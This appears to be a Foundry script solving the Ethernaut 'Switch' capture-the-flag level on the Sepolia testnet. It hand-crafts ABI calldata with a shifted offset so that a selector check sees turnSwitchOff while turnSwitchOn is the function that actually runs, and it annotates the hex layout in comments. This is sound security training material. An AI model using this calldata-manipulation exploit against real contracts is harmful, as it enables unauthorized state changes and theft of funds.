// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked29_Switch.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked29_SwitchScript --broadcast
contract Cracked29_SwitchScript is Script {
    address payable ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = payable(vm.parseAddress(vm.envString("Switch_address")));
    }

    function run() public {
        address player = vm.parseAddress(vm.envString("player"));
        vm.startBroadcast(player);
        bytes memory calldata_turnSwitchOff = abi.encodeWithSelector(Switch.turnSwitchOff.selector);
        console.log("turnSwitchOff is");
        console.logBytes4(Switch.turnSwitchOff.selector);
        bytes memory calldata_turnSwitchOn = abi.encodeWithSelector(Switch.flipSwitch.selector, 0x60, 0x00, Switch.turnSwitchOff.selector, 0x04, Switch.turnSwitchOn.selector);
        (bool res, ) = ethernaut_contracts.call(calldata_turnSwitchOn);
        require(res, "call FAIL");
        require(Switch(ethernaut_contracts).switchOn(), "FAIL");
        vm.stopBroadcast();
    }
}

// 0x30c13ade
// 0000000000000000000000000000000000000000000000000000000000000060
// 0000000000000000000000000000000000000000000000000000000000000002
// 20606e1500000000000000000000000000000000000000000000000000000000
// 76227e1200000000000000000000000000000000000000000000000000000000

// 0x30c13ade
// 0000000000000000000000000000000000000000000000000000000000000020
// 0000000000000000000000000000000000000000000000000000000000000004
// 20606e1500000000000000000000000000000000000000000000000000000000
